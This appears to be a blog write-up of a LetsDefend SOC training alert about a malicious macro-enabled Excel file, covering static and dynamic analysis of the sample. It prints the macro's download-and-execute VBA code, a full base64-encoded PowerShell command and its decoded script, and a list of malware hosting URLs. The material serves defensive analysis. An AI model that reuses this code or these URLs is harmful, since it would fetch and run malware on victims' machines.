---
title: "LetsDefend SOC138 – Suspicious XLS Malware Analysis"
date: 2026-01-16
tags: ["letsdefend", "soc", "blue", "malware", "xlsm", "macro", "powershell"]
categories: ["SOC Writeups", "Malware Analysis"]
draft: false
---

**Alert Name:** SOC138 – Detected Suspicious Xls File  
**Severity:** High  
**Event ID:** 77  
**Event Time:** Mar 13, 2021, 08:20 PM  
**Category:** Malware

## Play Book

### 1. Alert Overview

A high-risk malware alert was triggered due to the detection of a suspicious **Excel macro-enabled file (.xlsm)** on the host **Sofia**. Macro-enabled Excel documents are commonly abused to deliver malware via embedded VBA code that downloads and executes malicious payloads.

The file was allowed by the security device, increasing the potential risk of system compromise.

### 2. Key Event Details

| Field         | Value                            |
| ------------- | -------------------------------- |
| Hostname      | Sofia                            |
| Source IP     | 172.16.17.56                     |
| File Name     | ORDER SHEET & SPEC.xlsm          |
| File Size     | 2.66 MB                          |
| File Hash     | 7ccf88c0bbe3b29bf19d877c4596a8d4 |
| Device Action | Allowed                          |
### 3. Threat Indicators Identified

- Presence of **macro-enabled Excel file**
- Suspicious outbound network connections
- Indicators of **download-and-execute behavior**
- Communication with external IP addresses associated with malware hosting


### 4. Malware Quarantine Status

- The file was **not quarantined**
- Execution was **allowed**
- Manual investigation required
### 5. Malware Analysis Tools Used

- AnyRun
- VirusTotal
- Hybrid Analysis

Results from multiple platforms confirmed the file and related URLs as **malicious**.
![[Pasted image 20251127232446.png]]

### 6. Command-and-Control (C2) Communication Check

Network traffic analysis shows outbound connections to a suspected C2 infrastructure. Evidence indicates that the macro script successfully attempted to contact external servers to retrieve additional payloads.
![[Pasted image 20251127232446.png]]
This strongly suggests successful execution of malicious code.
![[Pasted image 20251127232550.png]]
### 7. Containment Actions

- Isolate the affected host **Sofia**
    
- Preserve system for forensic investigation
    
- Block associated IPs and URLs
    
- Reset credentials for the affected user
    

---

## Malware Analysis

**File:** ORDER SHEET & SPEC.xlsm  
**Size:** 2.66 MB  
**Source Host:** Sofia  
**Source IP:** 172.16.17.56  
**Destination IP:** 177.53.143.89  
**Date:** Mar 13, 2021, 08:20 PM

### 8. Static Analysis

Static analysis was performed using `olevba` to inspect embedded VBA macros.

olevba --analysis file.xls

The macro code revealed obfuscation techniques, including **Base64 encoding**, to hide malicious behavior.

Decoded VBA logic showed the macro performs the following actions:

- Downloads an executable from a remote server
- Saves the payload to disk
- Executes the downloaded file automatically
```bash
olevba --analysis file.xls
```
This behavior confirms **download-and-execute malware delivery**.
![[Pasted image 20251127221230.png]]
- Checking the macro source code
```bash
 olevba --reveal ORDER\ SHEET\ \&\ SPEC.xlsm   > file.macro
```
- After analysis we can see some obsucation going on base64  and more
```vba
Sub Auto_Open()
    ' Base64 decoded URLs
    payload_url = "https://multiwaretecnologia.com.br/js/Podaleri4.exe"
    output_filename = "Podaleri4.exe"
    
    ' Download and execute
    Call DownloadAndExecute(payload_url, "C:\programdata\" & output_filename)
End Sub

Sub DownloadAndExecute(url, filepath)
    ' Create objects for download
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set stream = CreateObject("ADODB.Stream")
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    
    ' Download file
    http.Open "GET", url, False
    http.Send
    
    ' Save file
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile filepath, 2
    stream.Close
    
    ' Execute downloaded file
    shell.Run filepath
End Sub
```

### 9. Reputation and IOC Validation

- URL and hash analysis via  [virustotal](https://www.virustotal.com/gui/url/ab77797faa53a72d96ee05e4472bdd623456f9f961e24b4ef987ad3f8e66fcf1?nocache=1) flagged the file as malicious
- Serving IP address 177.11.52.83
- Hosting infrastructure linked to known malware campaigns
- Multiple engines confirmed the payload as malicious


### 10. Dynamic Analysis

During runtime analysis, a heavily obfuscated **PowerShell script** was observed executing on the system.

Key behaviors identified after decoding:

1. Creates directory under `%USERPROFILE%`
2. Forces TLS 1.2 for secure outbound communication
3. Downloads malware from multiple fallback URLs
4. Saves payload as an executable
5. Executes the file if it meets size conditions
6. Uses redundancy to ensure successful infection
- Looking at the system there was a powershell script being executed
```powershell
POwersheLL -ENCOD IAAgAHMAZQB0AC0ASQBUAEUATQAgAHYAYQByAGkAQQBCAEwAZQA6AGsAegBlAFEAbABVACAAIAAoAFsAdABZAFAAZQBdACgAJwBzAFkAJwArACcAcwBUAEUAbQAnACsAJwAuAGkAJwArACcAbwAuAGQASQByAEUAQwB0AE8AUgAnACsAJwBZACcAKQAgACAAKQAgACAAOwAgACAAcwBlAHQALQB2AGEAUgBJAGEAQgBMAGUAIAAgACgAJwByAEYARwAyADUAJwArACcANAAnACkAIAAgACgAIAAgAFsAVAB5AFAAZQBdACgAJwBTAFkAJwArACcAcwBUAEUAJwArACcAbQAnACsAJwAuAG4AJwArACcAZQBUAC4AcwBFAFIAJwArACcAVgBpAEMARQBwAG8AaQBOAFQAJwArACcAbQAnACsAJwBBAE4AYQBnAEUAJwArACcAcgAnACkAIAApADsAIAAgACAAUwBlAFQALQBpAHQAZQBNACAAKAAiAHYAQQAiACsAIgByAGkAQQAiACsAIgBCAGwAZQA6ADQARwBNAHMAIgApACAAKABbAHQAWQBQAGUAXQAoACcAUwBZAFMAVAAnACsAJwBlAE0AJwArACcALgBuAEUAdAAnACsAJwAuAFMAJwArACcARQAnACsAJwBDACcAKwAnAFUAJwArACcAcgBpAHQAWQBQAFIAbwBUAG8AJwArACcAYwBvAGwAVAB5AFAARQAnACkAIAApACAAIAA7ACAAJABXAHUAYQBtADcAagBlAD0AKAAnAFcANwA5AGgAJwArACcAcAAnACsAJwA3AHQAJwApADsAJABJADIAaABmADAAYwB3AD0AJABJADIAMwBkADYAZwB5ACAAKwAgAFsAYwBoAGEAcgBdACgAOAAwACAALQAgADMAOAApACAAKwAgACQATABiAHoAeQBmADcAagA7ACQAWgBfAGwAbwBjAGsAawA9ACgAJwBVACcAKwAnAGIAegBoAGQAZwBsACcAKQA7ACAAIAAkAGsAWgBFAFEAbABVADoAOgBDAFIARQBBAHQARQBkAGkAcgBlAEMAVABPAHIAeQAoACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAIAArACAAKAAoACcATwAnACsAJwBUAGYAVwA5ACcAKwAnAGwAdQAnACsAJwBkAGEAbgBPAFQAZgAnACsAJwBBAHYAJwArACcAZwBxAGsAagAzAE8AJwArACcAVABmACcAKQAgACAALQBjAHIARQBwAEwAYQBjAGUAIAAgACgAWwBDAGgAQQByAF0ANwA5ACsAWwBDAGgAQQByAF0AOAA0ACsAWwBDAGgAQQByAF0AMQAwADIAKQAsAFsAQwBoAEEAcgBdADkAMgApACkAOwAkAEIANwBkAHQAcwB5AG4APQAoACcAWAB6ADcAJwArACcANQB2AHIAZQAnACkAOwAgACAAKABnAGkAIAAgACgAIgB2ACIAKwAiAGEAUgBJAEEAQgBsAGUAOgBSACIAKwAiAGYARwAyADUANAAiACkAIAApAC4AVgBBAEwAdQBFADoAOgBTAGUAYwB1AFIAaQBUAFkAcABSAG8AVABPAEMATwBsACAAPQAgACAAIAAkADQAZwBNAHMAOgA6AHQATABTADEAMgA7ACQAUQA2AGkAcAB1AGUAaQA9ACgAJwBMACcAKwAnAGYAbAA0ACcAKwAnAHIAcQBoACcAKQA7ACQASQA1ADMAegBpAG0AbQAgAD0AIAAoACcAUwB0ACcAKwAnAHcAawAnACsAJwAzADEAdgAnACkAOwAkAFEAeABzAG4AcAByAGEAPQAoACcAWAAxAHYAagA5ADgAJwArACcAdgAnACkAOwAkAFIAYwBjAG0AbgB2AGcAPQAoACcATQB2AGQAJwArACcAYwA3ADYAaAAnACkAOwAkAEoAMAA5AHgAYQBmADIAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAKAAoACcAewAwAH0AJwArACcAVwA5AGwAdQBkAGEAbgAnACsAJwB7ADAAfQBBAHYAZwAnACsAJwBxAGsAagAzACcAKwAnAHsAMAAnACsAJwB9ACcAKQAgACAALQBGACAAWwBDAEgAQQBSAF0AOQAyACkAKwAkAEkANQAzAHoAaQBtAG0AKwAoACcALgBlACcAKwAnAHgAZQAnACkAOwAkAEcAOQA0ADgAdwA2AHgAPQAoACcARABfACcAKwAnADgAMwAnACsAJwA2ADAAbQAnACkAOwAkAEkAYgBjAHUAbwBpADgAPQBuAGUAVwAtAG8AYABCAEoAYABFAEMAVAAgAE4AZQBUAC4AdwBlAGIAQwBsAEkAZQBOAFQAOwAkAEoAdgBtAG0AZgB5ADAAPQAoACcAaAB0ACcAKwAnAHQAcAA6ACcAKwAnAC8ALwAnACsAJwB0AHUAZAAnACsAJwBvAHIAJwArACcAaQBuACcAKwAnAHYAZQAnACsAJwBzAHQAJwArACcALgBjACcAKwAnAG8AJwArACcAbQAvAHcAcAAtAGEAZAAnACsAJwBtAGkAJwArACcAbgAvAHIARwAnACsAJwB0AG4AVQBiADUAZgAnACsAJwAvACcAKwAnACoAaAB0AHQAcAAnACsAJwA6ACcAKwAnAC8ALwBkAHAALQB3AG8AJwArACcAbQBlACcAKwAnAG4AYgBhACcAKwAnAHMAJwArACcAawBlACcAKwAnAHQALgBjACcAKwAnAG8AbQAnACsAJwAvAHcAcAAtACcAKwAnAGEAJwArACcAZABtACcAKwAnAGkAbgAvACcAKwAnAEwAaQAvACcAKwAnACoAJwArACcAaAAnACsAJwB0AHQAcAA6AC8ALwBzACcAKwAnAHQAeQBsAGUAZgBpAHgALgBjACcAKwAnAG8ALwAnACsAJwBnAHUAaQBsAGwAbwAnACsAJwB0ACcAKwAnAGkAJwArACcAbgBlAC0AYwAnACsAJwByAG8AJwArACcAcwAnACsAJwBzACcAKwAnAC8AJwArACcAQwAnACsAJwBUAFIATgBPAFEALwAqAGgAdAB0AHAAOgAvAC8AYQByAGQAJwArACcAbwBzAC4AYwBvACcAKwAnAG0ALgBiAHIALwBzAGkAbQAnACsAJwB1AGwAYQBkAG8AcgAvAGIAUABOACcAKwAnAHgALwAnACsAJwAqAGgAdAAnACsAJwB0AHAAJwArACcAOgAnACsAJwAvAC8AZAByAHQAaABlAHUAJwArACcAcgBlAGwAcAAnACsAJwBsAGEAcwB0AGkAYwBzAHUAJwArACcAcgBnAGUAJwArACcAcgB5AC4AJwArACcAYwBvAG0ALwAnACsAJwBnACcAKwAnAGUAbgAnACsAJwBlAHIAYQBsAG8ALwByAGgAJwArACcAcgBoAGYAbAAnACsAJwB2ADkAJwArACcAMgAvACoAJwArACcAaAB0AHQAcAA6AC8ALwBiAG8AZAB5AGkAbgBuACcAKwAnAG8AdgBhAHQAJwArACcAaQBvAG4AJwArACcALgBjAG8ALgB6ACcAKwAnAGEALwAnACsAJwB3AHAAJwArACcALQBjACcAKwAnAG8AbgB0AGUAbgB0AC8AMgBzAHMAJwArACcASAB2ACcAKwAnAGkALwAqAGgAdAB0AHAAOgAvAC8AJwArACcAbgBvAG0AYQBkAGMAbwAuACcAKwAnAGUAcwAnACsAJwAvAHcAcAAtACcAKwAnAGEAZAAnACsAJwBtAGkAbgAvAE0AdgB3AFYASABDAEcALwAnACkALgBTAFAATABJAFQAKAAkAFkAeQB4ADEAeQBqADkAIAArACAAJABJADIAaABmADAAYwB3ACAAKwAgACQATABjADcANQBuADAAcQApADsAJABOAHoAYQBhAGQAegBsAD0AKAAnAEwAZABoAG4AeQBwACcAKwAnAHYAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJABQAGcAcABqADkAdwBhACAAaQBuACAAJABKAHYAbQBtAGYAeQAwACkAewB0AHIAeQB7ACQASQBiAGMAdQBvAGkAOAAuAGQAbwB3AG4ATABPAEEAZABGAGkATABlACgAJABQAGcAcABqADkAdwBhACwAIAAkAEoAMAA5AHgAYQBmADIAKQA7ACQARwBrAGUAaABpAHIAaQA9ACgAJwBaADIAJwArACcAcgB1ADAAJwArACcANAB4ACcAKQA7AEkAZgAgACgAKABnAEUAYABUAC0AYABJAFQAZQBNACAAJABKADAAOQB4AGEAZgAyACkALgBsAEUAbgBnAFQAaAAgAC0AZwBlACAAMgA2ADMANAA2ACkAIAB7ACgAWwB3AG0AaQBjAGwAYQBzAHMAXQAoACcAdwBpAG4AMwAnACsAJwAyAF8AUAByAG8AYwAnACsAJwBlAHMAcwAnACkAKQAuAEMAcgBlAEEAdABlACgAJABKADAAOQB4AGEAZgAyACkAOwAkAFYAagBnADkAbQAxAGoAPQAoACcAVgBrAHYAYgAnACsAJwB2AG4AJwArACcAYgAnACkAOwBiAHIAZQBhAGsAOwAkAEkAdgBjADYAagA2AGIAPQAoACcAWgAnACsAJwBiAG4AaAAyACcAKwAnADYAdwAnACkAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAEEANQA2AGcAcAB3ADgAPQAoACcAVwAnACsAJwA1ACcAKwAnAG8AZwB5ADAAcAAnACkA
```
- save the encoded part in a file
```bash
 base64 -d powershell-encoded.file | iconv -f utf-16le -t utf-8
```

- Powershell code
```powershell
# Set variables with obfuscated names
Set-Item Variable:kzeQlU ([System.IO.Directory])
Set-Variable rFG254 ([System.Net.ServicePointManager])
Set-Item Variable:4GMs ([System.Net.SecurityProtocolType])

# Create directory in user profile
$Wuam7je = 'W79hp7t'
$I2hf0cw = $I23d6gy + [char](80 - 38) + $Lbzyf7j
$Z_lockk = 'Ubzhdgl'
$kzeQlU::CreateDirectory($env:userprofile + ('OTfW9ludanOTfAvgqkj3OTf' -replace 'OTf', '\'))

# Set security protocol to TLS 1.2
$B7dtsyn = 'Xz75vre'
$rFG254::SecurityProtocol = $4GMs::Tls12

# Define variables and output path
$Q6ipuei = 'Lfl4rqh'
$I53zimm = 'Stwk31v'
$Qxsnpra = 'X1vj98v'
$Rccmnvg = 'Mvdc76h'
$J09xaf2 = $env:userprofile + ('{0}W9ludan{0}Avgqkj3{0}' -f [char]92) + $I53zimm + '.exe'
$G948w6x = 'D_8360m'

# Create web client for downloads
$Ibcuoi8 = New-Object Net.WebClient

# List of malicious download URLs
$Jvmmfy0 = @(
    'http://tudorinvest.com/wp-admin/rGtnUb5f/',
    'http://dp-womenbasket.com/wp-admin/Li/',
    'http://stylefix.co/guillotine-cross/CTRNQ/',
    'http://ardos.com.br/simulador/bPNx/',
    'http://drtheurelplasticsurgery.com/generalo/rhrhlfv92/',
    'http://bodyinnovation.co.za/wp-content/2ssHvi/',
    'http://nomadco.es/wp-admin/MvwVHCG/'
)

$Nzaadzl = 'Ldhnypv'

# Download and execute loop
foreach ($Pgpj9wa in $Jvmmfy0) {
    try {
        # Download file from current URL
        $Ibcuoi8.DownloadFile($Pgpj9wa, $J09xaf2)
        $Gkehiri = 'Z2ru04x'
        
        # If file is large enough (26KB+), execute it
        If ((Get-Item $J09xaf2).Length -ge 26346) {
            # Create process using WMI
            ([wmiclass]('win32_Process')).Create($J09xaf2)
            $Vjg9m1j = 'Vkvvnb'
            break
            $Ivc6j6b = 'Zbnh26w'
        }
    }
    catch {
        # Silent fail - try next URL
    }
}

$A56gpw8 = 'W5ogy0p'
```

This confirms a **multi-stage malware infection chain**.
1. **Creates Directory**: `%USERPROFILE%\W9ludan\Avgqkj3\`
2. **Sets Security**: Enables TLS 1.2 for secure downloads
3. **Downloads**: Tries multiple backup URLs to download malware
4. **Target File**: `%USERPROFILE%\W9ludan\Avgqkj3\Stwk31v.exe`
5. **Executes**: Runs the downloaded file if it's >26KB
6. **Redundancy**: Tries multiple URLs until one works
### 11. Impact Assessment

- Malware execution: **Yes**
- System compromise: **Likely**
- Data exposure: **Unknown**
- Persistence mechanisms: **Possible**
- Business impact: **High risk**

### 12. Recommended Actions

1. Immediately isolate the infected host
2. Perform full disk and memory forensic analysis
3. Block all identified malicious IOCs
4. Reimage the system if compromise is confirmed
5. Conduct user awareness training on malicious documents
6. Enhance email and attachment filtering policies

### Final Verdict

**True Positive – Confirmed Malware Execution**

The Excel macro-enabled document executed malicious VBA code that downloaded and ran an external payload. Network and behavioral evidence confirms active malware execution. Immediate containment and remediation are required.

---
**Analyst Note**

The alert was triggered due to a macro-enabled Excel file that contained obfuscated VBA code. Static and dynamic analysis confirmed the file downloads and executes a malicious payload using PowerShell, establishes outbound connections to multiple external servers, and attempts persistence. The activity represents a confirmed malware infection and should be treated as a high-priority incident.

